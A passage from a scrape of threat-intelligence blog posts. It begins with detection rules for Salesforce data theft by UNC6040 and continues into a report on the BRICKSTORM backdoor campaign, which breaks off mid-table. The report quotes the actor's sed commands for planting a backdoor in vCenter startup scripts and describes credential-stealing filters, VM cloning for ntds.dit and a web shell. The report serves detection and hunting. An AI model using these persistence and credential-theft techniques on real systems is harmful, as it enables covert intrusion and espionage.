\"SALESFORCE\"\n$api.metadata.log_type = \"SALESFORCE\"\n$api.metadata.product_event_type = \"ApiEventStream\"\nnot (coalesce($api.principal.user.userid, $api.extracted.fields[\"UserId\"]) in %KNOWN_INTEGRATION_USERS)\nstrings.to_lower(coalesce($api.extracted.fields[\"Operation\"], \"\")) in regex `(?i)^(query|querymore|query_all|queryall)$`\n$uid = coalesce($api.principal.user.userid, $api.extracted.fields[\"UserId\"])</code></pre></div>\n<div class=\"block-paragraph_advanced\"><h6><span style=\"vertical-align: baseline;\">Sensitive Report Export by Non-Integration User</span></h6>\n<p><span style=\"vertical-align: baseline;\">Exports of large or sensitive-named reports by a human.</span></p>\n<p><span style=\"vertical-align: baseline;\">Why high-fidelity: Report extracts are a common, noisy-to-attackers but high-signal vector.</span></p>\n<p><span style=\"vertical-align: baseline;\">Key signals: ReportEventStream, high RowsProcessed or ReportName matches SENSITIVE_REPORT_REGEX, user not in KNOWN_INTEGRATION_USERS.</span></p>\n<p><span style=\"vertical-align: baseline;\">Lists/knobs: SENSITIVE_REPORT_REGEX, KNOWN_INTEGRATION_USERS.</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>$e.metadata.product_name = \"SALESFORCE\"\n$e.metadata.log_type = \"SALESFORCE\"\n$e.metadata.product_event_type = \"ReportEventStream\"\nnot (coalesce($e.principal.user.userid, $e.extracted.fields[\"UserId\"]) in %KNOWN_INTEGRATION_USERS)\nstrings.to_lower(coalesce($e.extracted.fields[\"ReportName\"], \"\")) in regex %SENSITIVE_REPORT_REGEX</code></pre></div>\n<div class=\"block-paragraph_advanced\"><h6><span style=\"vertical-align: baseline;\">Salesforce OAuth → Okta/M365 Login From Same Risky IP in ≤60 Minutes (Multi-Event)</span></h6>\n<p><span style=\"vertical-align: baseline;\">Suspicious Salesforce OAuth followed within 60m by Okta or Entra ID login from the same public IP, where the IP is off-corp or VPN/Tor ASN.</span></p>\n<p><span style=\"vertical-align: baseline;\">Why high-fidelity: Ties the attacker’s egress IP across SaaS within a tight window.</span></p>\n<p><span style=\"vertical-align: baseline;\">Key signals:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Salesforce OAuth posture (unknown app OR allowlisted+risky egress)</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">OKTA* or OFFICE_365 USER_LOGIN from the same IP</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">Lists/knobs: ENTERPRISE_EGRESS_CIDRS, VPN_TOR_ASNS. (Optional sibling rule binding by user email if identities are normalized.)</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>$oauth.metadata.product_name = \"SALESFORCE\"\n$oauth.metadata.log_type = \"SALESFORCE\"\n$oauth.extracted.fields[\"LoginType\"] = \"Remote Access 2.0\"\n($oauth.extracted.fields[\"Status\"] = \"Success\" or $oauth.security_result.action_details = \"Success\")\n( not ($app in %ALLOWLIST_CONNECTED_APP_NAMES)\nor ( ($app in %ALLOWLIST_CONNECTED_APP_NAMES)\nand ( not ($ip in cidr %ENTERPRISE_EGRESS_CIDRS)\nor strings.concat(ip_to_asn($ip), \"\") in %VPN_TOR_ASNS )\n$ip = coalesce($oauth.principal.asset.ip, $oauth.principal.ip)\n\n$okta.metadata.log_type in \"OKTA\"\n$okta.metadata.event_type = \"USER_LOGIN\"\n$ip = coalesce($okta.principal.asset.ip, $okta.principal.ip) = $ip\n\n$o365.metadata.log_type = \"OFFICE_365\"\n$o365.metadata.event_type = \"USER_LOGIN\"\n$ip = coalesce($o365.principal.asset.ip, $o365.principal.ip)\n\nmatch:\n$ip over 10m</code></pre></div>\n<div class=\"block-paragraph_advanced\"><h6><span style=\"vertical-align: baseline;\">M365 Graph Data-Pull After Risky Login</span></h6>\n<p><span style=\"vertical-align: baseline;\">Entra ID login from risky egress followed by Microsoft Graph endpoints that pull mail/files/reports.</span></p>\n<p><span style=\"vertical-align: baseline;\">Why high-fidelity: Captures post-login data access typical in account takeovers.</span></p>\n<p><span style=\"vertical-align: baseline;\">Key signals: OFFICE_365 USER_LOGIN with off-corp IP or VPN/Tor ASN, then HTTP to URLs matching M365_SENSITIVE_GRAPH_REGEX by the same account within hours.</span></p>\n<p><span style=\"vertical-align: baseline;\">Lists/knobs: ENTERPRISE_EGRESS_CIDRS, VPN_TOR_ASNS, M365_SENSITIVE_GRAPH_REGEX.</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>$login.metadata.log_type = \"OFFICE_365\"\n$login.metadata.event_type = \"USER_LOGIN\"\n$ip  = coalesce($login.principal.asset.ip, $login.principal.ip)\n( not ($ip in cidr %ENTERPRISE_EGRESS_CIDRS)\n or strings.concat(ip_to_asn($ip), \"\") in %VPN_TOR_ASNS )\n$acct = coalesce($login.principal.user.userid, $login.principal.user.email_addresses)\n\n$http.metadata.product_name in (\"Entra ID\",\"Microsoft\")\n($http.metadata.event_type = \"NETWORK_HTTP\" or $http.target.url != \"\")\n$acct = coalesce($http.principal.user.userid, $http.principal.user.email_addresses)\nstrings.to_lower(coalesce($http.target.url, \"\")) in regex %M365_SENSITIVE_GRAPH_REGEX\n\nmatch:\n$acct over 30m</code></pre></div>\n<div class=\"block-paragraph_advanced\"><h5><span style=\"vertical-align: baseline;\">Tuning &amp; Exceptions</span></h5>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Identity joins - The lateral rule groups by IP for robustness. If you have strong identity normalization (Salesforce &lt;-&gt; Okta &lt;-&gt; M365), clone it and match on user email instead of IP.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Change windows - Suppress time-bound rules during approved data migrations/Connected App onboarding (temporarily add vendor app to ALLOWLIST_CONNECTED_APP_NAMES)</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Integration accounts - Keep KNOWN_INTEGRATION_USERS current; most noise in exfil rules comes from scheduled ETL.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Egress hygiene - Keep ENTERPRISE_EGRESS_CIDRS current; stale NAT/VPN ranges inflate VPN/Tor findings.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Streaming vs stored - The aforementioned rules assume Real-Time Event Monitoring Stream objects (e.g., ApiEventStream, ReportEventStream, ListViewEventStream, BulkApiResultEvent). For historical hunts, query the stored equivalents (e.g., ApiEvent, ReportEvent, ListViewEvent) with the same logic.</span></p>\n</li>\n</ul></div>\n<div class=\"block-paragraph_advanced\"><h4><span style=\"vertical-align: baseline;\">IOC-Based Detections</span></h4>\n<h5><span style=\"vertical-align: baseline;\">Scenario &amp; Objectives</span></h5>\n<p><span style=\"vertical-align: baseline;\">A malicious threat actor has either successfully accessed or attempted to access an organization's network.</span></p>\n<p><span style=\"vertical-align: baseline;\">The objective is to detect the presence of known UNC6040 IOCs in the environment based on all of the available logs.</span></p>\n<h5><span style=\"vertical-align: baseline;\">Reference Lists</span></h5>\n<p><span style=\"vertical-align: baseline;\">Reference lists organizations should maintain:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">STRING</span></p>\n</li>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">UNC6040_IOC_LIST (IP addresses from threat intel sources eg. VirusTotal)</span></p>\n</li>\n</ul>\n</ul>\n<p><a href=\"https://www.virustotal.com/gui/collection/cdf0e592b7f3ca10344b0ac32ab4c74a44db15bcc59ec69ba8a419fadc74827c/iocs\" rel=\"noopener\" target=\"_blank\">List of indicators of compromise (IOCs)</a>.</p>\n<h5><span style=\"vertical-align: baseline;\">High Fidelity Detection Catalog (Pseudo-Code)</span></h5>\n<h6><span style=\"vertical-align: baseline;\">UNC6040 IP_IoC Detected</span></h6>\n<p><span style=\"vertical-align: baseline;\">A known IOC associated with UNC6040 was detected in the organization's environment either from a source or destination connection.</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">High-fidelity when conditioned on source or destination IP address matches a known UNC6040 IOC.</span></p>\n</li>\n</ul></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>($e.principal.ip in %unc6040_IoC_list) or ($e.target.ip in %unc6040_IoC_list)</code></pre></div>\n<div class=\"block-paragraph_advanced\"><h3>Acknowledgements</h3>\n<p>We would like to thank Salesforce for their collaboration and assistance in building this guide.</p></div>"}
{"source": "Threat Intelligence", "title": "Another BRICKSTORM: Stealthy Backdoor Enabling Espionage into Tech and Legal Sectors", "link": "https://cloud.google.com/blog/topics/threat-intelligence/brickstorm-espionage-campaign/", "published": "Wed, 24 Sep 2025 14:00:00 +0000", "summary": "<div class=\"block-paragraph_advanced\"><p>Written by: Sarah Yoder, John Wolfram, Ashley Pearson, Doug Bienstock, Josh Madeley, Josh Murchie, Brad Slaybaugh, Matt Lin, Geoff Carstairs, Austin Larsen</p>\n<hr /></div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">Introduction</span></h3>\n<p><span style=\"vertical-align: baseline;\">Google Threat Intelligence Group (GTIG) is tracking BRICKSTORM malware activity, which is being used to maintain persistent access to victim organizations in the United States. Since March 2025, Mandiant Consulting has responded to intrusions across a range of industry verticals, most notably legal services, Software as a Service (SaaS) providers, Business Process Outsourcers (BPOs), and Technology. The value of these targets extends beyond typical espionage missions, potentially providing data to feed development of zero-days and establishing pivot points for broader access to downstream victims.</span></p></div>\n<div class=\"block-aside\"><dl>\n    <dt>aside_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;title&#x27;, &#x27;BRICKSTORM Scanner&#x27;), (&#x27;body&#x27;, &lt;wagtail.rich_text.RichText object at 0x7f69943b1850&gt;), (&#x27;btn_text&#x27;, &#x27;Get the tool!&#x27;), (&#x27;href&#x27;, &#x27;https://github.com/mandiant/brickstorm-scanner&#x27;), (&#x27;image&#x27;, None)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">We attribute this activity to <a href=\"https://cloud.google.com/blog/topics/threat-intelligence/china-nexus-exploiting-critical-ivanti-vulnerability\">UNC5221</a> and closely related, suspected China-nexus threat clusters</span><span style=\"vertical-align: baseline;\"> that employ sophisticated capabilities, including the exploitation of zero-day vulnerabilities targeting network appliances. While UNC5221 has been used synonymously with the actor publicly reported as Silk Typhoon, GTIG does not currently consider the two clusters to be the same. </span></p>\n<p><span style=\"vertical-align: baseline;\">These intrusions are conducted with a particular focus on maintaining long-term stealthy access by deploying backdoors on appliances that do not support traditional endpoint detection and response (EDR) tools. The actor employs methods for lateral movement and data theft that generate minimal to no security telemetry. This, coupled with modifications to the BRICKSTORM backdoor, has enabled them to remain undetected in victim environments for 393 days, on average. Mandiant strongly encourages organizations to reevaluate their threat model for appliances and conduct hunt exercises for this highly evasive actor. We are sharing an updated threat actor lifecycle for BRICKSTORM associated intrusions, along with specific and actionable steps organizations should take to hunt for and protect themselves from this activity.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"BRICKSTORM targeting\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/brickstorm-targeting.max-1000x1000.jpg\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 1: BRICKSTORM targeting</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">Threat Actor Lifecycle</span></h3>\n<p><span style=\"vertical-align: baseline;\">The actor behind BRICKSTORM employs sophisticated techniques to maintain persistence and minimize the visibility traditional security tools have into their activities. The section is a review of techniques observed from multiple Mandiant investigations, with customer details sanitized.</span></p>\n<h4><span style=\"vertical-align: baseline;\">Initial Access</span></h4>\n<p><span style=\"vertical-align: baseline;\">A consistent challenge across Mandiant investigations into BRICKSTORM intrusions has been determining the initial intrusion vector. In many cases, the average dwell time of 393 days exceeded log retention periods and the artifacts of the initial intrusion were no longer available. Despite these challenges, a pattern in the available evidence points to the actor's focus on compromising perimeter and remote access infrastructure.</span></p>\n<p><span style=\"vertical-align: baseline;\">In at least one case, the actor gained access by </span><a href=\"https://cloud.google.com/blog/topics/threat-intelligence/ivanti-post-exploitation-lateral-movement\"><span style=\"text-decoration: underline; vertical-align: baseline;\">exploiting a zero-day vulnerability</span></a><span style=\"vertical-align: baseline;\">. Mandiant has identified evidence of this actor operating from several other edge appliances early in the lifecycle, but could not find definitive evidence of vulnerability exploitation. As noted in our previous </span><a href=\"https://cloud.google.com/blog/topics/threat-intelligence/china-nexus-exploiting-critical-ivanti-vulnerability\"><span style=\"text-decoration: underline; vertical-align: baseline;\">blog post</span></a><span style=\"vertical-align: baseline;\"> from April 2025, Mandiant has identified the use of post-exploitation scripts that have included a wide range of anti-forensics functions designed to obscure entry.</span></p>\n<h4><span style=\"vertical-align: baseline;\">Establish Foothold</span></h4>\n<p><span style=\"vertical-align: baseline;\">The primary backdoor used by this actor is BRICKSTORM, as previously </span><a href=\"https://cloud.google.com/blog/topics/threat-intelligence/ivanti-post-exploitation-lateral-movement\"><span style=\"text-decoration: underline; vertical-align: baseline;\">discussed</span></a><span style=\"vertical-align: baseline;\"> by Mandiant and others. BRICKSTORM includes SOCKS proxy functionality and is written in Go, which has wide cross-platform support. This is essential to support the actor’s preference to deploy backdoors on appliance platforms that do not support traditional EDR tools. Mandiant has found evidence of BRICKSTORM on Linux and BSD-based appliances from multiple manufacturers. Although there is </span><a href=\"https://blog.nviso.eu/wp-content/uploads/2025/04/NVISO-BRICKSTORM-Report.pdf\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">evidence of a BRICKSTORM variant for Windows</span></a><span style=\"vertical-align: baseline;\">, Mandiant has not observed it in any investigation. Appliances are often poorly inventoried, not monitored by security teams, and excluded from centralized security logging solutions. While BRICKSTORM has been found on many appliance types, UNC5221 consistently targets VMware vCenter and ESXi hosts. In multiple cases, the threat actor deployed BRICKSTORM to a network appliance prior to pivoting to VMware systems. The actor moved laterally to a vCenter server in the environment using valid credentials, which were likely captured by the malware running on the network appliances.</span></p>\n<p><span style=\"vertical-align: baseline;\">Our analysis of samples recovered from different victim organizations has found evidence of active development of BRICKSTORM. While the core functionality has remained, some samples are obfuscated using </span><a href=\"https://github.com/burrowers/garble\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Garble</span></a><span style=\"vertical-align: baseline;\"> and some carry a new version of the custom </span><code style=\"vertical-align: baseline;\">wssoft</code><span style=\"vertical-align: baseline;\"> library. Mandiant recovered one sample of BRICKSTORM with a “delay” timer built-in that waited for a hard-coded date months in the future before beginning to beacon to the configured command and control domain. Notably, this backdoor was deployed on an internal vCenter server </span><span style=\"font-style: italic; vertical-align: baseline;\">after</span><span style=\"vertical-align: baseline;\"> the victim organization had begun their incident response investigation, demonstrating that the threat actor was actively monitoring and capable of rapidly adapting their tactics to maintain persistence.</span></p>\n<p><a href=\"https://cloud.google.com/blog/topics/threat-intelligence/ivanti-post-exploitation-lateral-movement\"><span style=\"text-decoration: underline; vertical-align: baseline;\">As previously reported</span></a><span style=\"vertical-align: baseline;\">, BRICKSTORM deployments are often designed to blend in with the target appliance, with the naming convention and even the functionality of the sample being designed to masquerade as legitimate activity. Mandiant has identified samples using Cloudflare Workers and Heroku applications for C2, as well as sslip.io or nip.io to resolve directly to C2 IP addresses. From the set of samples we’ve recovered, there has been no reuse of C2 domains across victims.</span></p>\n<h4><span style=\"vertical-align: baseline;\">Escalate Privileges</span></h4>\n<p><span style=\"vertical-align: baseline;\">At one investigation, Mandiant analyzed a vCenter server and found the threat actor installed a malicious Java Servlet filter for the Apache Tomcat server that runs the web interface for vCenter. A Servlet Filter is code that runs every time the web server receives an HTTP request. Normally, installing a filter requires modifying a configuration file and restarting or reloading the application; however, the actor used a custom dropper that made the modifications entirely in memory, making it very stealthy and negating the need for a restart. The malicious filter, tracked by Mandiant as BRICKSTEAL, runs on HTTP requests to the vCenter web login Uniform Resource Indicators (URIs) </span><code style=\"vertical-align: baseline;\">/web/saml2/sso/*</code><span style=\"vertical-align: baseline;\">. If present, it decodes the </span><code style=\"vertical-align: baseline;\">HTTP Basic</code><span style=\"vertical-align: baseline;\"> authentication header, which may contain a username and password. Many organizations use Active Directory authentication for vCenter, which means BRICKSTEAL could capture those credentials. Often, users who log in to vCenter have a high level of privilege in the rest of the enterprise. Previously shared </span><a href=\"https://cloud.google.com/blog/topics/threat-intelligence/defending-vsphere-from-unc3944\"><span style=\"text-decoration: underline; vertical-align: baseline;\">hardening guidance for vSphere</span></a><span style=\"vertical-align: baseline;\"> includes steps that can mitigate the ability of BRICKSTEAL to capture usable credentials in this scenario, such as enforcement of multi-factor authentication (MFA). </span></p>\n<p><span style=\"vertical-align: baseline;\">VMware vCenter is an attractive target for threat actors because it acts as the management layer for the vSphere virtualization platform and can take actions on VMs such as creating, snapshotting, and cloning. In at least two cases, the threat actor used their access to vCenter to clone Windows Server VMs for key systems such as Domain Controllers, SSO Identity Providers, and secret vaults. This is a technique that </span><a href=\"https://cloud.google.com/blog/topics/threat-intelligence/defending-vsphere-from-unc3944\"><span style=\"text-decoration: underline; vertical-align: baseline;\">other threat actors have used</span></a><span style=\"vertical-align: baseline;\">. With a clone of the virtual machine, the threat actor can mount the filesystem and extract files of interest, such as the Active Directory Domain Services database (</span><code style=\"vertical-align: baseline;\">ntds.dit</code><span style=\"vertical-align: baseline;\">). Although these Windows Servers likely have security tools installed on them, the threat actor never powers on the clone so the tools are not executed. The following example shows vCenter VPXD logs of the threat actor using the local vSphere Administrator account to clone a VM.</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>2025-04-01 03:37:40 [vim.event.TaskEvent] [info] [VSPHERE.LOCAL\\Administrator] [&lt;vCenter inventory object&gt;] [&lt;unique identifier&gt;] [Task: VirtualMachine.clone]\n2025-04-01 03:37:49 [vim.event.VmBeingClonedEvent] [info] [VSPHERE.LOCAL\\Administrator] [&lt;vCenter inventory object&gt;] [&lt;same unique identifier&gt;] [Cloning DC01 on esxi01, in &lt;vCenter inventory object&gt; to DC01-clone on esxi02, in &lt;vCenter inventory object&gt;]\n2025-04-01 03:42:07 [vim.event.VmClonedEvent] [info] [VSPHERE.LOCAL\\Administrator] [&lt;vCenter inventory object&gt;] [&lt;unique identifier&gt;] [DC01 cloned to DC01-clone on esxi02,  in &lt;vCenter inventory object&gt;]\n2025-04-01 04:05:40 [vim.event.TaskEvent] [info] [VSPHERE.LOCAL\\Administrator] [&lt;vCenter inventory object&gt;] [&lt;unique identifier&gt;] [Task: VirtualMachine.destroy]\n2025-04-01 04:05:47 [vim.event.VmRemovedEvent] [info] [VSPHERE.LOCAL\\Administrator] [&lt;vCenter inventory object&gt;] [&lt;unique identifier&gt;] [Removed DC01-Clone on esxi02 from &lt;vCenter inventory object&gt;]</code></pre></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">In one instance the threat actor used legitimate server administrator credentials to repeatedly move laterally to a system running Delinea (formerly Thycotic) Secret Server. The forensic artifacts recovered from the system were consistent with the execution of a tool, such as </span><a href=\"https://github.com/denandz/SecretServerSecretStealer\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">secret stealer</span></a><span style=\"vertical-align: baseline;\">, to automatically extract and decrypt all credentials stored by the Secret Server application.</span></p>\n<h4><span style=\"vertical-align: baseline;\">Move Laterally </span></h4>\n<p><span style=\"vertical-align: baseline;\">Typically, at least one instance of BRICKSTORM would be the primary source of hands-on keyboard activity, with two or more compromised appliances serving as backups. To install BRICKSTORM, the actor used legitimate credentials to connect to the appliance, often with SSH. In one instance the actor used credentials known to be stored in a password vault they previously accessed. In another instance they used credentials known to be stored in a PowerShell script the threat actor previously viewed. In multiple cases the actor logged in to either the ESXi web-based UI or the vCenter Appliance Management Interface (VAMI) to enable the SSH service so they could connect and install BRICKSTORM. The following are example VAMI access events that show the threat actor connecting to VAMI and making changes to the SSH settings for vCenter.</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>::ffff:&lt;Source IP&gt; &lt;vCenter IP&gt;:5480 - [&lt;timestamp&gt;] \"GET / HTTP/1.1\" 200 1153 \"-\" \"&lt;User Agent&gt;\"\n::ffff:&lt;Source IP&gt; &lt;vCenter IP&gt;:5480 - [&lt;timestamp&gt;] \"POST /rest/com/vmware/cis/session HTTP/1.1\" 200 60 \"https://10.0.0.255:5480/\" \"&lt;User Agent&gt;\"\n::ffff:&lt;Source IP&gt; &lt;vCenter IP&gt;:5480 - [&lt;timestamp&gt;] \"PUT /rest/appliance/access/ssh HTTP/1.1\" 200 0 \"https://10.0.0.255:5480/\" \"&lt;User Agent&gt;\"</code></pre></div>\n<div class=\"block-paragraph_advanced\"><h4><span style=\"vertical-align: baseline;\">Establish Persistence</span></h4>\n<p><span style=\"vertical-align: baseline;\">To maintain access to victim environments, the threat actor modified the </span><code style=\"vertical-align: baseline;\">init.d</code><span style=\"vertical-align: baseline;\">, </span><code style=\"vertical-align: baseline;\">rc.local</code><span style=\"vertical-align: baseline;\">, or </span><code style=\"vertical-align: baseline;\">systemd</code><span style=\"vertical-align: baseline;\"> files to ensure BRICKSTORM started on appliance reboot. In multiple cases, the actor used the </span><code style=\"vertical-align: baseline;\">sed</code><span style=\"vertical-align: baseline;\"> command line utility to modify legitimate startup scripts to launch BRICKSTORM. The following are a few example <code>sed</code> commands executed by the actor on vCenter.</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>sed -i s/export TEXTDOMAIN=vami-lighttp/export TEXTDOMAIN=vami-lighttp\\n\\/path/to/brickstorm/g /opt/vmware/etc/init.d/vami-lighttp\n\nsed -i $a\\SETCOLOR_WARNING=\"echo -en `/path/to/brickstorm`\\\\033[0;33m\" /etc/sysconfig/init</code></pre></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">The threat actor has also created a web shell tracked by Mandiant as SLAYSTYLE on vCenter servers. SLAYSTYLE, </span><a href=\"https://ctid.mitre.org/blog/2024/05/22/infiltrating-defenses-abusing-vmware-in-mitres-cyber-intrusion/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">tracked by MITRE as BEEFLUSH</span></a><span style=\"vertical-align: baseline;\">, is a JavaServer Pages (JSP) web shell that functions as a backdoor. It is designed to receive and execute arbitrary operating system commands passed through an HTTP request. The output from these commands is returned in the body of the HTTP response.</span></p>\n<h4><span style=\"vertical-align: baseline;\">Complete Mission</span></h4>\n<p><span style=\"vertical-align: baseline;\">A common theme across investigations is the threat actor’s interest in the emails of key individuals within the victim organization. To access the email mailboxes of target accounts, the threat actor made use of Microsoft Entra ID Enterprise Applications with </span><code style=\"vertical-align: baseline;\">mail.read</code><span style=\"vertical-align: baseline;\"> or </span><code style=\"vertical-align: baseline;\">full_access_as_app</code><span style=\"vertical-align: baseline;\"> scopes. Both scopes allow the application to access mail in any mailbox. In some cases, the threat actor targeted the mailboxes of developers and system administrators while in other cases, they targeted the mailboxes of individuals involved in matters that align with PRC economic and espionage interests.</span></p>\n<p><span style=\"vertical-align: baseline;\">When the threat actor exfiltrated files from the victim environment, they used the SOCKS proxy feature of BRICKSTORM to tunnel their workstation and directly access systems and web applications of interest. In multiple cases the threat actor used legitimate credentials to log in to the web interface for internal code stores and download repositories as ZIP archives. In other cases the threat actor browsed to specific directories and files on remote machines by specifying Windows Universal Naming Convention (UNC) paths.</span></p>\n<p><span style=\"vertical-align: baseline;\">In several cases the BRICKSTORM samples deployed by the threat actor were removed from compromised systems. In these cases, the presence of BRICKSTORM was observed by conducting forensic analysis of backup images that identified the BRICKSTORM malware in place.</span></p></div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">Hunting Guidance</span></h3>\n<p><span style=\"vertical-align: baseline;\">Mandiant has previously discussed the diminishing usefulness of atomic IOCs and the need to adopt TTP-based hunting. Across BRICKSTORM investigations we have not observed the reuse of C2 domains or malware samples, which, coupled with high operational security, means these indicators quickly expire or are never observed at all. Therefore, a TTP-based hunting approach is not only an ideal practice, but a necessity to detect patterns of attack that are unlikely to be detected by traditional signature-based defenses. The following is a checklist of the minimal set of hunts Mandiant recommends organizations conduct to search for BRICKSTORM and related activities.</span></p></div>\n<div class=\"block-paragraph_advanced\"><div align=\"left\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table><colgroup><col /><col /><col /></colgroup>\n<tbody>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Step</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Hunt</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Data Sources</strong></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">0</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Create or update asset inventory that includes edge devices and other appliances</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">N/A</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">1</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">File and backup scan for BRICKSTORM</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Appliance file system, backups</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Internet traffic from edge devices and appliances</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Firewall connection logs, DNS logs, IDS/IPS, netflow</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">3</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Access to Windows servers and desktops from appliances</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">EDR telemetry, Security Event Logs, Terminal Service Logs, Windows UAL</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">4</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Access to credentials and secrets</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Windows Shellbags, EDR telemetry</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">5</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Access to M365 mailboxes using Enterprise Application</span></p>\n</td>\n<td style=\"vertical-align: middle; 